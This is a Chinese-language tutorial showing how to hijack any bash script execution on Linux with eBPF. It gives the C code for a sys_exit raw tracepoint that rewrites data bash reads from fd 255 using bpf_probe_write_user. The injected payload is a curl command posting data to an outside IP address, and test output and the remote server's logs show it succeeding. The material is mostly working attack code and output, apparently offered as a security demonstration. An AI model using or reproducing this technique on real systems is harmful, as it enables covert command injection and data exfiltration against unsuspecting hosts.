
## Bash Hijack Step by Step

### Bash劫持原理  
攻击目标：让目标机器上任意一个bash命令，都能被我替换和劫持。  

现在创建一个测试bash文件:
```
# 1：创建测试a.sh
$ echo 'echo "eBPF payload-------------------------------------"' > a.sh

# 2. 观察运行情况
$ strace bash a.sh
...
read(255, "echo \"eBPF payload--------------"..., 57) = 57
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x3), ...}, AT_EMPTY_PATH) = 0
write(1, "eBPF payload--------------------"..., 50eBPF payload-------------------------------------
) = 50
read(255, "", 57)
...
```
发现其行为是不断的从bash文件read，然后再去执行。
并且将文件从fd=3复制到fd=255，dup2(3, 255)。因此我们只需要在read exit的时候，将读到的内容改掉。  

### eBPF劫持程序开发  

1. 写eBPF代码，在read退出的时候替换内容  

```c
SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (is_target_process()) return 0;

	// https://elixir.bootlin.com/linux/v5.4.170/source/include/trace/events/syscalls.h#L18
	unsigned long syscall_id;
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_ax);

	switch (syscall_id)
	{
	case 0:
		handle_exit_read(ctx);
		break;
	}

	return 0;
}
```

在handle_exit_read中修改bash内容：  
```c
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
	int tick = fetch_global_int(GLOBAL_TICK1);
	save_global_val(GLOBAL_TICK1, tick);

	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);

	int read_bytes = 0;
	bpf_probe_read(&read_bytes, sizeof(read_bytes),&regs->ax);

	int read_fd = 0;
	bpf_probe_read(&read_fd , sizeof(read_fd),&regs->di);
	// bpf_log("read fd: %d n bytes: %d\n", read_fd, read_bytes);

	if (read_fd != 255) {
		goto exit;
	}

	char *buffer = NULL;
	bpf_probe_read(&buffer , sizeof(buffer) , &regs->si);
	// bpf_log("read data: %s\n", buffer);

	char PAYLOAD[] = "curl -d uid=Local http://202.112.238.191 #";
	int ret = -1;
	if(read_bytes > sizeof(PAYLOAD)){
		bpf_log("try to send request---------------------------\n");
		ret = bpf_probe_write_user((char *)(buffer), PAYLOAD, sizeof(PAYLOAD));
	}

exit:
	bpf_log("handle_exit_read: %d %d\n", tick, ret);
	return 0;
} 
```

2. 测试  
a. terminal-1中启动eBPF劫持程序  
```
$ cd getting-start/1-bash
$ bash compile.sh
```

b. terminal-2中启动测试bash
```
# $ echo 'echo "eBPF payload-------------------------------------"' > a.sh

# 可以看到被劫持
$ bash a.sh
Success to visit Server. Your IP is 58.19.0.203
```

去网站上查看结果：  
http://202.112.238.191/log?appid=ebpf-sec-2022-1a 
```
2022-07-11 20:16:36,619 record-server INFO Get User: [Local] IP: [58.19.0.203]
2022-07-11 20:16:43,853 record-server INFO Get User: [Local] IP: [58.19.0.203]
```